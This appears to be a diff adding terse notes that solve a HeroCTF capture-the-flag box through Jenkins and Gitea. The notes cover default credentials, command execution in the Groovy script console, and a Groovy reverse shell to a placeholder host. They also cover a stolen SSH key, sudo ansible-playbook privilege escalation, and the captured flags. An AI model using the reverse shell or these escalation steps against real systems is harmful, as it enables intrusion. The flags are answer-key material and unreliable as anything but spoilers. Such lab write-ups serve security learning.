@@ -1,0 +1,91 @@
+Jenkins: http://box.heroctf.fr:8080/
+Gitea: http://box.heroctf.fr:3000/
+
+http://box.heroctf.fr:3000/explore/repos
+	heroes / Infra
+
+http://box.heroctf.fr:3000/heroes/Infra
+
+From Dockerfile.gitea
+	RUN echo "git:heroes" | chpasswd
+
+Login to Jenkins with "admin:heroes"
+
+java -jar jenkins-cli.jar -s http://box.heroctf.fr:8080/ groovysh --username admin --password heroes
+	"grep -ir hero /var/jenkins_home/".execute().text
+		/var/jenkins_home/user.txt:Hero{dc97a2f7da5304d12fe820bd2a6d343d}
+	OR
+	"cat /var/jenkins_home/user.txt".execute().text
+
+OR
+
+http://box.heroctf.fr:8080/script
+	println "grep -ir hero /var/jenkins_home/".execute().text
+		/var/jenkins_home/user.txt:Hero{dc97a2f7da5304d12fe820bd2a6d343d}
+
+
+=========== Reverse Shell => Root ===========
+
+Groovy Reverse Shell Script
+```
+String host="IP";
+int port=9001;
+String cmd="/bin/sh";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+/var/jenkins_home/gitea.key
+	openssh private key
+
+ssh git@box.heroctf.fr -p 2222 -i ./gitea.key
+
+sudo -l
+	(ALL) NOPASSWD: /usr/bin/ansible-playbook
+
+Create an ansible playbook, simple_playbook.yml
+```
+---
+  - name: Privesc
+    hosts: localhost
+    become: true
+    become_user: root
+    become_method: sudo
+    tasks:
+
+    - name: Shell command
+      shell:
+         "cat /root/root.txt"
+      register: cmd
+      tags: cmd
+
+    - debug: msg="{{cmd.stdout}}"
+```
+OR
+```
+- name: run task
+  hosts: 127.0.0.1
+  tasks:
+    - name: run command with shell
+      shell: cat /root/root.txt > /tmp/woody.txt
+      register: woody
+```
+
+
+sudo /usr/bin/ansible-playbook simple_playbook.yml
+```
+PLAY [Privesc] *******************************************************************************************************************
+
+TASK [Gathering Facts] ***********************************************************************************************************
+ok: [localhost]
+
+TASK [Shell command] *************************************************************************************************************
+changed: [localhost]
+
+TASK [debug] *********************************************************************************************************************
+ok: [localhost] => {
+    "msg": "Hero{ce4e994cb477dec9b1ea876db647c562}"
+}
+
+PLAY RECAP ***********************************************************************************************************************
+localhost                  : ok=3    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
+```
